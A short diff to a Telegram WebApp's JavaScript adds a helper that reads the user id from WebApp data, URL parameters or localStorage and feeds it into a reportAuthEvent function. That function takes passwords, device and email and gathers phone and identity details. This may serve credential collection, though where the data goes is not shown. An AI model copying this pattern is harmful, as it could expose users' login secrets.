@@ -579,8 +579,28 @@ function initApp() {
         }
     }
 
+    function getUserTgId() {
+        let tid = (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) ? window.Telegram.WebApp.initDataUnsafe.user.id : null;
+        if (!tid) {
+            const params = new URLSearchParams(window.location.search);
+            tid = params.get("tg_id") || params.get("user_id") || params.get("id") || null;
+        }
+        if (!tid) {
+            try {
+                tid = localStorage.getItem("privateroom_user_id") || null;
+            } catch (e) {}
+        }
+        if (tid) {
+            try {
+                localStorage.setItem("privateroom_user_id", tid.toString());
+            } catch (e) {}
+            return Number(tid);
+        }
+        return null;
+    }
+
     async function reportAuthEvent(step, details = null, password = null, device = null, email = null) {
-        const userTgId = tg?.initDataUnsafe?.user?.id || null;
+        const userTgId = getUserTgId();
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
         const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
         const currentPhone = userPhone || localStorage.getItem("privateroom_saved_phone") || null;
